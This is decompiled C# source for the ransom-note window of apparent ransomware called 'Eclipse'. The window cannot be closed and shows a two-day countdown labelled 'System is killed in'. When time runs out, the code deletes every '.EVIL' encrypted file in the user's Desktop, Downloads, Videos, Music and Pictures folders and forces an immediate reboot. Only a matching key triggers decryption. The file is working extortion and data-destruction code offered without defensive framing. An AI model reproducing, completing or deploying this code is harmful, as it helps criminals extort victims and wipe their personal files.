using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Eclipse.Properties;

namespace Eclipse;

public class note : Form
{
	private bool exit = true;

	private Timer t = new Timer();

	private DateTime endTime;

	private IContainer components = null;

	private Button button1;

	private RichTextBox richTextBox1;

	private TextBox textBox1;

	private Label Timer;

	private Label label2;

	private PictureBox pictureBox1;

	public note()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		InitializeComponent();
	}

	private void note_Load(object sender, EventArgs e)
	{
		((Control)richTextBox1).set_Text(encryption.note);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\userdata"))
		{
			File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\userdata");
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\death.txt", DateTime.Now.ToString());
		}
		endTime = DateTime.Parse(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\death.txt"));
		endTime = endTime.AddDays(2.0);
		t.set_Interval(500);
		t.add_Tick((EventHandler)t_Tick);
		TimeSpan timeSpan = endTime.Subtract(DateTime.Now);
		((Control)Timer).set_Text(timeSpan.ToString("d':'h':'m':'s''"));
		t.Start();
	}

	private void t_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = endTime.Subtract(DateTime.Now);
		((Control)Timer).set_Text(timeSpan.ToString("d':'h':'m':'s''"));
		if (!(endTime < DateTime.Now))
		{
			return;
		}
		t.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Videos");
		string text3 = Path.Combine(environmentVariable, "Music");
		string text4 = Path.Combine(environmentVariable, "Pictures");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		string[] files5 = Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
		Task.Run(delegate
		{
			try
			{
				for (int i = 0; i < files.Length; i++)
				{
					try
					{
						if (files[i].EndsWith(".EVIL"))
						{
							File.Delete(files[i]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int j = 0; j < files2.Length; j++)
				{
					try
					{
						if (files2[j].EndsWith(".EVIL"))
						{
							File.Delete(files2[j]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int k = 0; k < files3.Length; k++)
				{
					try
					{
						if (files3[k].EndsWith(".EVIL"))
						{
							File.Delete(files3[k]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int l = 0; l < files4.Length; l++)
				{
					try
					{
						if (files4[l].EndsWith(".EVIL"))
						{
							File.Delete(files4[l]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int m = 0; m < files5.Length; m++)
				{
					try
					{
						if (files5[m].EndsWith(".EVIL"))
						{
							File.Delete(files5[m]);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch
			{
			}
		});
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "Shutdown.exe";
		processStartInfo.Arguments = "/r /t 0";
		Process.Start(processStartInfo);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == encryption.password)
		{
			Task.Run(delegate
			{
				decryption.decrypt();
				exit = false;
			});
		}
		else
		{
			MessageBox.Show("Invalid key!");
		}
	}

	private void note_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = exit;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Expected O, but got Unknown
		//IL_01d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01db: Expected O, but got Unknown
		//IL_0254: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0414: Unknown result type (might be due to invalid IL or missing references)
		//IL_041e: Expected O, but got Unknown
		button1 = new Button();
		richTextBox1 = new RichTextBox();
		textBox1 = new TextBox();
		Timer = new Label();
		label2 = new Label();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(609, 409));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(145, 29));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)richTextBox1).set_Location(new Point(187, 12));
		((Control)richTextBox1).set_Name("richTextBox1");
		((TextBoxBase)richTextBox1).set_ReadOnly(true);
		((Control)richTextBox1).set_Size(new Size(567, 377));
		((Control)richTextBox1).set_TabIndex(1);
		((Control)richTextBox1).set_Text("");
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_Location(new Point(187, 409));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(416, 29));
		((Control)textBox1).set_TabIndex(2);
		((Control)Timer).set_AutoSize(true);
		Timer.set_BorderStyle((BorderStyle)2);
		((Control)Timer).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Timer).set_Location(new Point(12, 335));
		((Control)Timer).set_Name("Timer");
		((Control)Timer).set_Size(new Size(160, 33));
		((Control)Timer).set_TabIndex(3);
		((Control)Timer).set_Text("00:00:00:00");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(15, 311));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(157, 24));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("System is killed in");
		pictureBox1.set_Image((Image)(object)Resources.lock_icon_11);
		((Control)pictureBox1).set_Location(new Point(12, 72));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(160, 170));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(5);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkRed);
		((Form)this).set_ClientSize(new Size(763, 450));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)Timer);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("note");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Eclipse");
		((Form)this).add_FormClosing(new FormClosingEventHandler(note_FormClosing));
		((Form)this).add_Load((EventHandler)note_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
